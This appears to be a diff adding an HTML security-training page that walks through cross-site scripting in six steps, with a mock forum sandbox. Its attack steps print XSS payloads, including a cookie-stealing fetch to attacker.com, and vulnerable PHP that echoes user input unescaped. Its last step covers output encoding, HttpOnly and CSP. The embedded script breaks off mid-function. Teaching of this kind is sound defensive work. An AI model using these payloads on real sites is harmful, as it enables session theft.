@@ -1,0 +1,1276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Attack Simulation & Sandbox | Enterprise Security Training</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --obsidian: #0a0a0f;
+            --obsidian-light: #12121a;
+            --white: #ffffff;
+            --neon-purple: #b983ff;
+            --neon-red: #ff4757;
+            --gold: #ffd700;
+            --cyan: #00d9ff;
+            --gray: #6b7280;
+            --gray-light: #9ca3af;
+            --success: #10b981;
+            --warning: #f59e0b;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--obsidian);
+            color: var(--white);
+            line-height: 1.6;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            text-align: center;
+            padding: 30px 0;
+            border-bottom: 2px solid var(--neon-purple);
+            margin-bottom: 30px;
+        }
+
+        header h1 {
+            font-size: 2.5rem;
+            color: var(--white);
+            margin-bottom: 10px;
+            text-shadow: 0 0 20px rgba(185, 131, 255, 0.5);
+        }
+
+        header p {
+            color: var(--gray-light);
+            font-size: 1.1rem;
+        }
+
+        .main-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+
+        @media (max-width: 1200px) {
+            .main-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .explanation-panel {
+            background: var(--obsidian-light);
+            border-radius: 12px;
+            padding: 30px;
+            border: 1px solid rgba(185, 131, 255, 0.2);
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .step-indicator::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: var(--gray);
+            transform: translateY(-50%);
+            z-index: 0;
+        }
+
+        .step-dot {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: var(--obsidian);
+            border: 3px solid var(--gray);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            z-index: 1;
+            transition: all 0.3s ease;
+        }
+
+        .step-dot.active {
+            border-color: var(--neon-purple);
+            background: var(--neon-purple);
+            box-shadow: 0 0 20px rgba(185, 131, 255, 0.6);
+        }
+
+        .step-dot.completed {
+            border-color: var(--success);
+            background: var(--success);
+        }
+
+        .step-content {
+            display: none;
+        }
+
+        .step-content.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .step-title {
+            font-size: 1.8rem;
+            color: var(--neon-purple);
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(185, 131, 255, 0.3);
+        }
+
+        .dual-lens {
+            margin-bottom: 30px;
+        }
+
+        .lens-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            padding: 25px;
+            margin-bottom: 20px;
+            border-left: 4px solid;
+        }
+
+        .lens-card.simple {
+            border-left-color: var(--cyan);
+        }
+
+        .lens-card.technical {
+            border-left-color: var(--neon-purple);
+        }
+
+        .lens-title {
+            font-size: 1.3rem;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .lens-title.simple {
+            color: var(--cyan);
+        }
+
+        .lens-title.technical {
+            color: var(--neon-purple);
+        }
+
+        .lens-icon {
+            font-size: 1.5rem;
+        }
+
+        .code-block {
+            background: #1e1e2e;
+            border-radius: 8px;
+            padding: 20px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.95rem;
+            overflow-x: auto;
+            margin: 15px 0;
+            border: 1px solid rgba(185, 131, 255, 0.2);
+        }
+
+        .code-keyword {
+            color: var(--neon-purple);
+        }
+
+        .code-string {
+            color: var(--gold);
+        }
+
+        .code-comment {
+            color: var(--gray);
+        }
+
+        .code-danger {
+            color: var(--neon-red);
+        }
+
+        .sandbox-panel {
+            background: var(--obsidian-light);
+            border-radius: 12px;
+            padding: 30px;
+            border: 1px solid rgba(185, 131, 255, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .browser-mockup {
+            background: var(--white);
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+        }
+
+        .browser-header {
+            background: #e5e5e5;
+            padding: 12px 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid #d1d1d1;
+        }
+
+        .browser-dots {
+            display: flex;
+            gap: 6px;
+        }
+
+        .browser-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .browser-dot.red { background: #ff5f56; }
+        .browser-dot.yellow { background: #ffbd2e; }
+        .browser-dot.green { background: #27c93f; }
+
+        .browser-url {
+            flex: 1;
+            background: var(--white);
+            padding: 8px 15px;
+            border-radius: 5px;
+            font-size: 0.85rem;
+            color: #333;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .browser-url-icon {
+            width: 16px;
+            height: 16px;
+            background: var(--success);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+        }
+
+        .browser-content {
+            padding: 25px;
+            min-height: 400px;
+            background: #fafafa;
+        }
+
+        .forum-header {
+            text-align: center;
+            margin-bottom: 25px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid #e5e5e5;
+        }
+
+        .forum-header h2 {
+            color: #333;
+            font-size: 1.5rem;
+            margin-bottom: 5px;
+        }
+
+        .forum-header p {
+            color: #666;
+            font-size: 0.9rem;
+        }
+
+        .comments-section {
+            margin-bottom: 30px;
+        }
+
+        .comment {
+            background: var(--white);
+            border: 1px solid #e5e5e5;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 15px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            animation: slideIn 0.4s ease;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .comment-author {
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .comment-avatar {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--neon-purple), var(--cyan));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
+
+        .comment-text {
+            color: #444;
+            line-height: 1.5;
+        }
+
+        .comment-text.malicious {
+            color: var(--neon-red);
+            font-family: 'Courier New', monospace;
+            background: rgba(255, 71, 87, 0.1);
+            padding: 10px;
+            border-radius: 5px;
+            border-left: 3px solid var(--neon-red);
+        }
+
+        .comment-text.safe {
+            color: var(--gray);
+            font-family: 'Courier New', monospace;
+            background: rgba(107, 114, 128, 0.1);
+            padding: 10px;
+            border-radius: 5px;
+        }
+
+        .comment-form {
+            background: #f0f0f0;
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid #e5e5e5;
+        }
+
+        .comment-form label {
+            display: block;
+            color: #333;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .comment-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ddd;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-family: inherit;
+            margin-bottom: 15px;
+            transition: border-color 0.3s ease;
+        }
+
+        .comment-input:focus {
+            outline: none;
+            border-color: var(--neon-purple);
+        }
+
+        .comment-input.malicious-input {
+            border-color: var(--neon-red);
+            background: rgba(255, 71, 87, 0.05);
+        }
+
+        .btn {
+            padding: 12px 30px;
+            border: none;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--neon-purple), #9d5cff);
+            color: var(--white);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(185, 131, 255, 0.4);
+        }
+
+        .btn-success {
+            background: linear-gradient(135deg, var(--success), #059669);
+            color: var(--white);
+        }
+
+        .btn-danger {
+            background: linear-gradient(135deg, var(--neon-red), #dc2626);
+            color: var(--white);
+        }
+
+        .btn-warning {
+            background: linear-gradient(135deg, var(--warning), #d97706);
+            color: var(--white);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .navigation-controls {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(185, 131, 255, 0.3);
+        }
+
+        .attacker-server {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            width: 180px;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            border: 2px solid var(--neon-red);
+            border-radius: 10px;
+            padding: 15px;
+            box-shadow: 0 0 30px rgba(255, 71, 87, 0.3);
+            z-index: 10;
+            display: none;
+        }
+
+        .attacker-server.active {
+            display: block;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 30px rgba(255, 71, 87, 0.3); }
+            50% { box-shadow: 0 0 50px rgba(255, 71, 87, 0.6); }
+        }
+
+        .attacker-header {
+            color: var(--neon-red);
+            font-weight: bold;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .stolen-cookies {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 5px;
+            padding: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.8rem;
+            color: var(--gold);
+            min-height: 60px;
+        }
+
+        .cookie-animation {
+            position: absolute;
+            width: 30px;
+            height: 30px;
+            background: var(--gold);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.7rem;
+            font-weight: bold;
+            color: #000;
+            box-shadow: 0 0 15px var(--gold);
+            z-index: 100;
+            animation: none;
+        }
+
+        .cookie-animation.flying {
+            animation: flyToAttacker 2s ease-in forwards;
+        }
+
+        @keyframes flyToAttacker {
+            0% {
+                transform: translate(0, 0) scale(1);
+                opacity: 1;
+            }
+            100% {
+                transform: translate(400px, -150px) scale(0.5);
+                opacity: 0;
+            }
+        }
+
+        .alert-modal {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: var(--white);
+            border: 3px solid var(--neon-red);
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 0 50px rgba(255, 71, 87, 0.5);
+            z-index: 200;
+            display: none;
+            text-align: center;
+        }
+
+        .alert-modal.active {
+            display: block;
+            animation: shake 0.5s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translate(-50%, -50%) rotate(0deg); }
+            25% { transform: translate(-52%, -50%) rotate(-2deg); }
+            75% { transform: translate(-48%, -50%) rotate(2deg); }
+        }
+
+        .alert-modal h3 {
+            color: var(--neon-red);
+            margin-bottom: 15px;
+        }
+
+        .alert-modal p {
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .dom-tree {
+            background: #1e1e2e;
+            border-radius: 8px;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            margin: 15px 0;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        .dom-node {
+            padding: 5px 0;
+            border-left: 2px solid var(--gray);
+            padding-left: 15px;
+            margin-left: 10px;
+        }
+
+        .dom-node.script {
+            color: var(--neon-red);
+            border-left-color: var(--neon-red);
+        }
+
+        .dom-node.safe {
+            color: var(--success);
+            border-left-color: var(--success);
+        }
+
+        .toggle-defenses {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            z-index: 50;
+        }
+
+        .defense-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: bold;
+        }
+
+        .defense-indicator.active {
+            background: rgba(16, 185, 129, 0.2);
+            color: var(--success);
+            border: 1px solid var(--success);
+        }
+
+        .defense-indicator.inactive {
+            background: rgba(255, 71, 87, 0.2);
+            color: var(--neon-red);
+            border: 1px solid var(--neon-red);
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: var(--gray);
+            border-radius: 3px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--neon-purple), var(--cyan));
+            border-radius: 3px;
+            transition: width 0.5s ease;
+            width: 0%;
+        }
+
+        .highlight-box {
+            background: rgba(185, 131, 255, 0.1);
+            border: 1px solid var(--neon-purple);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+
+        .highlight-box.warning {
+            background: rgba(255, 71, 87, 0.1);
+            border-color: var(--neon-red);
+        }
+
+        .highlight-box.success {
+            background: rgba(16, 185, 129, 0.1);
+            border-color: var(--success);
+        }
+
+        .instruction-banner {
+            background: linear-gradient(135deg, rgba(0, 217, 255, 0.1), rgba(185, 131, 255, 0.1));
+            border: 2px dashed var(--cyan);
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .instruction-banner h4 {
+            color: var(--cyan);
+            margin-bottom: 10px;
+        }
+
+        .instruction-banner code {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            display: inline-block;
+            margin: 10px 0;
+        }
+
+        footer {
+            text-align: center;
+            padding: 30px;
+            border-top: 1px solid rgba(185, 131, 255, 0.2);
+            color: var(--gray);
+        }
+
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 20px;
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid var(--success);
+            border-radius: 20px;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔐 Cross-Site Scripting (XSS) Attack Simulation</h1>
+            <p>Enterprise Security Training | Hands-On Sandbox Environment</p>
+            <div class="security-badge">
+                <span>🛡️</span>
+                <span>Secure SDLC Training Module</span>
+            </div>
+        </header>
+
+        <div class="main-grid">
+            <!-- Left Column: Explanations -->
+            <div class="explanation-panel">
+                <div class="step-indicator">
+                    <div class="step-dot active" data-step="1">1</div>
+                    <div class="step-dot" data-step="2">2</div>
+                    <div class="step-dot" data-step="3">3</div>
+                    <div class="step-dot" data-step="4">4</div>
+                    <div class="step-dot" data-step="5">5</div>
+                    <div class="step-dot" data-step="6">6</div>
+                </div>
+
+                <!-- Step 1: Normal Web Page -->
+                <div class="step-content active" id="step1">
+                    <h2 class="step-title">Step 1: The Normal Web Page (Baseline)</h2>
+                    
+                    <div class="dual-lens">
+                        <div class="lens-card simple">
+                            <h3 class="lens-title simple">
+                                <span class="lens-icon">📖</span>
+                                The Simple Story
+                            </h3>
+                            <p>Imagine a community bulletin board in your local library. People can read existing notices and pin up their own messages. Everything is checked by the librarian before posting, so all messages are safe and trustworthy. When you read a notice, you simply absorb the information—nothing unexpected happens.</p>
+                        </div>
+
+                        <div class="lens-card technical">
+                            <h3 class="lens-title technical">
+                                <span class="lens-icon">⚙️</span>
+                                The Industry Mechanics
+                            </h3>
+                            <p>In a standard web application, the client (browser) requests a page from the server. The server responds with HTML, which the browser parses into the <strong>Document Object Model (DOM)</strong>—a tree structure representing all page elements.</p>
+                            
+                            <div class="code-block">
+<span class="code-comment">&lt;!-- Normal HTML structure --&gt;</span>
+<span class="code-keyword">&lt;div</span> <span class="code-string">class="comment"</span><span class="code-keyword">&gt;</span>
+  <span class="code-keyword">&lt;p&gt;</span>Hello, this is a safe comment!<span class="code-keyword">&lt;/p&gt;</span>
+<span class="code-keyword">&lt;/div&gt;</span>
+                            </div>
+
+                            <p>The browser treats all content between tags as <strong>data</strong>, not executable code. This is the foundation of web security: clear separation between content (HTML) and behavior (JavaScript).</p>
+                        </div>
+                    </div>
+
+                    <div class="highlight-box">
+                        <strong>🎯 Your Task:</strong> In the sandbox on the right, type a normal comment like "Great article!" and click Post to see how safe content rendering works.
+                    </div>
+                </div>
+
+                <!-- Step 2: The Vulnerability -->
+                <div class="step-content" id="step2">
+                    <h2 class="step-title">Step 2: The Vulnerability (Unsanitized Output)</h2>
+                    
+                    <div class="dual-lens">
+                        <div class="lens-card simple">
+                            <h3 class="lens-title simple">
+                                <span class="lens-icon">🚨</span>
+                                The Simple Story
+                            </h3>
+                            <p>Now imagine the library gets a new, careless administrator. They allow anyone to pin messages without checking them. Worse, they even let people attach special instructions written in a secret code that the library's reading machines automatically execute. A malicious person could slip in a note that says "When someone reads this, give me your library card!"</p>
+                        </div>
+
+                        <div class="lens-card technical">
+                            <h3 class="lens-title technical">
+                                <span class="lens-icon">⚙️</span>
+                                The Industry Mechanics
+                            </h3>
+                            <p>The critical vulnerability: the backend application <strong>reflects user input directly into the HTML response without proper encoding</strong>. This is called <strong>Reflected XSS</strong> or <strong>Stored XSS</strong> (if saved to a database).</p>
+                            
+                            <div class="code-block">
+<span class="code-comment">&lt;!-- VULNERABLE CODE (PHP example) --&gt;</span>
+<span class="code-keyword">&lt;div</span> <span class="code-string">class="comment"</span><span class="code-keyword">&gt;</span>
+  <span class="code-danger">&lt;?php echo $_GET['comment']; ?&gt;</span>  <span class="code-comment">&lt;!-- DANGEROUS! --&gt;</span>
+<span class="code-keyword">&lt;/div&gt;</span>
+
+<span class="code-comment">&lt;!-- If user submits: &lt;script&gt;alert('XSS')&lt;/script&gt; --&gt;</span>
+<span class="code-comment">&lt;!-- Browser renders: &lt;script&gt;alert('XSS')&lt;/script&gt; --&gt;</span>
+                            </div>
+
+                            <p class="code-danger">⚠️ The browser cannot distinguish between legitimate HTML tags and malicious ones injected by an attacker. All &lt;script&gt; tags are executed in the context of the trusted domain.</p>
+                        </div>
+                    </div>
+
+                    <div class="highlight-box warning">
+                        <strong>⚠️ Key Insight:</strong> The Same-Origin Policy (SOP) protects against cross-domain attacks, but XSS bypasses SOP because the malicious script runs under the <em>trusted site's origin</em>.
+                    </div>
+                </div>
+
+                <!-- Step 3: Crafting the Payload -->
+                <div class="step-content" id="step3">
+                    <h2 class="step-title">Step 3: Crafting the Payload (The Injection)</h2>
+                    
+                    <div class="dual-lens">
+                        <div class="lens-card simple">
+                            <h3 class="lens-title simple">
+                                <span class="lens-icon">🎭</span>
+                                The Simple Story
+                            </h3>
+                            <p>The attacker writes a seemingly normal message but embeds hidden hypnotic commands. To the casual observer, it looks like gibberish symbols, but to the library's reading machine, it's a clear instruction: "When anyone reads this message, secretly photocopy their library card and mail it to address evil@attacker.com."</p>
+                        </div>
+
+                        <div class="lens-card technical">
+                            <h3 class="lens-title technical">
+                                <span class="lens-icon">⚙️</span>
+                                The Industry Mechanics
+                            </h3>
+                            <p>An XSS payload is JavaScript code wrapped in HTML tags that the browser will parse and execute. Common vectors include:</p>
+                            
+                            <div class="code-block">
+<span class="code-comment">&lt;!-- Classic Script Tag --&gt;</span>
+<span class="code-danger">&lt;script&gt;alert('XSS')&lt;/script&gt;</span>
+
+<span class="code-comment">&lt;!-- Image Tag with onerror --&gt;</span>
+<span class="code-danger">&lt;img src="x" onerror="alert('XSS')"&gt;</span>
+
+<span class="code-comment">&lt;!-- SVG with onload --&gt;</span>
+<span class="code-danger">&lt;svg onload="alert('XSS')"&gt;</span>
+
+<span class="code-comment">&lt;!-- Cookie Stealing Payload --&gt;</span>
+<span class="code-danger">&lt;script&gt;fetch('https://attacker.com/steal?c='+document.cookie)&lt;/script&gt;</span>
+                            </div>
+
+                            <p>The <code>onerror</code> attribute is particularly dangerous because it executes JavaScript when the image fails to load—a guaranteed trigger when <code>src="x"</code> is invalid.</p>
+                        </div>
+                    </div>
+
+                    <div class="instruction-banner">
+                        <h4>🎯 Your Turn to Attack</h4>
+                        <p>Copy this payload into the sandbox input field:</p>
+                        <code>&lt;img src="x" onerror="alert('Hacked!')"&gt;</code>
+                        <p>Then click <strong>Post</strong> to inject the malicious script.</p>
+                    </div>
+                </div>
+
+                <!-- Step 4: Execution Context -->
+                <div class="step-content" id="step4">
+                    <h2 class="step-title">Step 4: Execution Context (The Victim's Browser)</h2>
+                    
+                    <div class="dual-lens">
+                        <div class="lens-card simple">
+                            <h3 class="lens-title simple">
+                                <span class="lens-icon">😯</span>
+                                The Simple Story
+                            </h3>
+                            <p>An innocent library member walks up to read the bulletin board. Their brain (trained to follow all instructions on notices) automatically reads and executes the hidden command. They don't even realize they're doing it—the message looked like any other notice, so their guard was down.</p>
+                        </div>
+
+                        <div class="lens-card technical">
+                            <h3 class="lens-title technical">
+                                <span class="lens-icon">⚙️</span>
+                                The Industry Mechanics
+                            </h3>
+                            <p>When the victim's browser loads the page, it parses the HTML into the DOM. The injected <code>&lt;script&gt;</code> tag (or event handler like <code>onerror</code>) is treated as legitimate code and executed in the <strong>trusted origin's context</strong>.</p>
+                            
+                            <div class="dom-tree">
+                                <div class="dom-node">&lt;html&gt;</div>
+                                <div class="dom-node">&lt;body&gt;</div>
+                                <div class="dom-node">&lt;div class="forum"&gt;</div>
+                                <div class="dom-node script">&lt;img src="x" onerror="alert('Hacked!')"&gt; ⚠️ MALICIOUS</div>
+                                <div class="dom-node">&lt;/div&gt;</div>
+                                <div class="dom-node">&lt;/body&gt;</div>
+                                <div class="dom-node">&lt;/html&gt;</div>
+                            </div>
+
+                            <p><strong>Browser Security Model:</strong></p>
+                            <ul style="margin-left: 20px; margin-top: 10px;">
+                                <li>✅ SOP allows scripts to access cookies, localStorage, and DOM of the same origin</li>
+                                <li>❌ XSS tricks SOP by making malicious code appear as same-origin</li>
+                                <li>⚠️ The browser has no way to know the script was injected by an attacker</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="highlight-box">
+                        <strong>👁️ Watch the Sandbox:</strong> Notice how the alert popup appears—this is the script executing in your browser's context, with full access to the page's data.
+                    </div>
+                </div>
+
+                <!-- Step 5: Session Hijacking -->
+                <div class="step-content" id="step5">
+                    <h2 class="step-title">Step 5: Session Hijacking (Action on Objectives)</h2>
+                    
+                    <div class="dual-lens">
+                        <div class="lens-card simple">
+                            <h3 class="lens-title simple">
+                                <span class="lens-icon">🎫</span>
+                                The Simple Story
+                            </h3>
+                            <p>The hidden instruction doesn't just show a popup—it silently photocopies the victim's VIP library card (which grants access to restricted sections) and mails it to the attacker. Now the attacker can walk into the library pretending to be the victim, accessing everything the victim could access.</p>
+                        </div>
+
+                        <div class="lens-card technical">
+                            <h3 class="lens-title technical">
+                                <span class="lens-icon">⚙️</span>
+                                The Industry Mechanics
+                            </h3>
+                            <p>The real danger of XSS is <strong>session hijacking</strong>. Web applications use cookies to maintain user sessions. The malicious script can read these cookies and exfiltrate them:</p>
+                            
+                            <div class="code-block">
+<span class="code-comment">&lt;!-- Cookie Stealing Payload --&gt;</span>
+<span class="code-danger">&lt;script&gt;</span>
+  <span class="code-keyword">const</span> cookie = <span class="code-string">document.cookie</span>;
+  <span class="code-keyword">fetch</span>(<span class="code-string">'https://attacker.com/steal?c='</span> + cookie);
+<span class="code-danger">&lt;/script&gt;</span>
+
+<span class="code-comment">&lt;!-- Example stolen cookie: --&gt;</span>
+<span class="code-string">session_id=abc123xyz; user_id=456; token=secret789</span>
+                            </div>
+
+                            <p><strong>Impact:</strong></p>
+                            <ul style="margin-left: 20px; margin-top: 10px;">
+                                <li>🔑 Attacker gains full account access</li>
+                                <li>💰 Financial fraud, data theft, privilege escalation</li>
+                                <li>🏢 Enterprise: lateral movement, data exfiltration</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="highlight-box warning">
+                        <strong>🚨 Critical:</strong> Session tokens are the keys to the kingdom. Once stolen, the attacker can impersonate the victim until the session expires or is invalidated.
+                    </div>
+                </div>
+
+                <!-- Step 6: Enterprise Mitigation -->
+                <div class="step-content" id="step6">
+                    <h2 class="step-title">Step 6: Enterprise Mitigation (Encoding & CSP)</h2>
+                    
+                    <div class="dual-lens">
+                        <div class="lens-card simple">
+                            <h3 class="lens-title simple">
+                                <span class="lens-icon">🛡️</span>
+                                The Simple Story
+                            </h3>
+                            <p>The library implements new rules: all messages are now translated into a "safe format" before posting. Special symbols like angle brackets are converted into harmless pictures of those symbols. Even if someone writes "hypnotic commands," they're displayed as plain text—like showing a picture of a fire alarm instead of an actual alarm that could go off.</p>
+                        </div>
+
+                        <div class="lens-card technical">
+                            <h3 class="lens-title technical">
+                                <span class="lens-icon">⚙️</span>
+                                The Industry Mechanics
+                            </h3>
+                            <p><strong>Three-Layer Defense Strategy:</strong></p>
+                            
+                            <div class="code-block">
+<span class="code-comment">/* 1. Context-Aware Output Encoding */</span>
+<span class="code-keyword">&lt;?php</span>
+<span class="code-keyword">echo</span> <span class="code-keyword">htmlspecialchars</span>($comment, ENT_QUOTES, <span class="code-string">'UTF-8'</span>);
+<span class="code-comment">// &lt; becomes &amp;lt;  &gt; becomes &amp;gt;  " becomes &amp;quot;</span>
+<span class="code-keyword">?&gt;</span>
+
+<span class="code-comment">/* 2. HttpOnly Cookie Flag */</span>
+Set-Cookie: session_id=abc123; <span class="code-success">HttpOnly</span>; Secure; SameSite=Strict
+
+<span class="code-comment">/* 3. Content Security Policy (CSP) */</span>
+Content-Security-Policy: <span class="code-success">default-src 'self'</span>; script-src 'self'
+                            </div>
+
+                            <p><strong>Defense in Depth:</strong></p>
+                            <ul style="margin-left: 20px; margin-top: 10px;">
+                                <li>✅ <strong>Output Encoding:</strong> Neutralizes injected code by converting special characters to HTML entities</li>
+                                <li>✅ <strong>HttpOnly:</strong> Prevents JavaScript from accessing cookies via <code>document.cookie</code></li>
+                                <li>✅ <strong>CSP:</strong> Whitelists trusted script sources, blocking inline scripts</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="instruction-banner">
+                        <h4>🛡️ Test the Defenses</h4>
+                        <p>Click the <strong>"Toggle Defenses ON"</strong> button in the sandbox, then try the same XSS payload again.</p>
+                        <p>Watch how it renders as <em>harmless text</em> instead of executing!</p>
+                    </div>
+
+                    <div class="highlight-box success">
+                        <strong>✅ Best Practice:</strong> Always validate input on the server, encode output based on context (HTML, JavaScript, URL, CSS), and implement CSP as a safety net.
+                    </div>
+                </div>
+
+                <div class="navigation-controls">
+                    <button class="btn btn-primary" id="prevBtn" onclick="changeStep(-1)" disabled>← Previous</button>
+                    <button class="btn btn-primary" id="nextBtn" onclick="changeStep(1)">Next →</button>
+                </div>
+
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+            </div>
+
+            <!-- Right Column: Sandbox -->
+            <div class="sandbox-panel">
+                <div class="toggle-defenses">
+                    <button class="btn" id="toggleDefenseBtn" onclick="toggleDefenses()">
+                        🛡️ Toggle Defenses: <span id="defenseStatus">OFF</span>
+                    </button>
+                </div>
+
+                <div class="attacker-server" id="attackerServer">
+                    <div class="attacker-header">
+                        <span>🎯</span>
+                        <span>Attacker Server</span>
+                    </div>
+                    <div class="stolen-cookies" id="stolenCookies">
+                        Waiting for cookies...
+                    </div>
+                </div>
+
+                <div class="browser-mockup">
+                    <div class="browser-header">
+                        <div class="browser-dots">
+                            <div class="browser-dot red"></div>
+                            <div class="browser-dot yellow"></div>
+                            <div class="browser-dot green"></div>
+                        </div>
+                        <div class="browser-url">
+                            <div class="browser-url-icon">🔒</div>
+                            <span>https://forum.enterprise.com/discussions</span>
+                        </div>
+                    </div>
+
+                    <div class="browser-content" id="browserContent">
+                        <div class="forum-header">
+                            <h2>Enterprise Security Forum</h2>
+                            <p>Share your thoughts on cybersecurity best practices</p>
+                        </div>
+
+                        <div class="comments-section" id="commentsSection">
+                            <!-- Comments will be dynamically added here -->
+                        </div>
+
+                        <div class="comment-form">
+                            <label for="commentInput">Leave a Comment</label>
+                            <input 
+                                type="text" 
+                                id="commentInput" 
+                                class="comment-input"
+                                placeholder="Type your comment here..."
+                            >
+                            <button class="btn btn-primary" onclick="postComment()">
+                                📝 Post Comment
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="alert-modal" id="alertModal">
+                    <h3>🚨 XSS Alert Triggered!</h3>
+                    <p>This alert proves the malicious script executed in your browser's context.</p>
+                    <p><strong>In a real attack, this could steal your session cookies!</strong></p>
+                    <button class="btn btn-danger" onclick="closeAlert()">OK</button>
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <p>© 2026 Enterprise Security Training | XSS Attack Simulation & Sandbox</p>
+            <p>For educational purposes only. Always practice responsible security testing.</p>
+        </footer>
+    </div>
+
+    <script>
+        // State Management
+        let currentStep = 1;
+        const totalSteps = 6;
+        let defensesOn = false;
+        let comments = [];
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            updateStepIndicator();
+            addInitialComments();
+        });
+
+        // Step Navigation
+        function changeStep(direction) {
+            // Hide current step
+            document.getElementById(`step${currentStep}`).classList.remove('active');
+            document.querySelector(`.step-dot[data-step="${currentStep}"]`).classList.remove('active');
+            document.querySelector(`.step-dot[data-step="${currentStep}"]`).classList.add('completed');
+
+            // Update step
+            currentStep += direction;
+            if (currentStep < 1) currentStep = 1;
+            if (currentStep > totalSteps) currentStep = totalSteps;
+
+            // Show new step
+            document.getElementById(`step${currentStep}`).classList.add('active');
+            document.querySelector(`.step-dot[data-step="${currentStep}"]`).classList.add('active');
+
+            // Update buttons
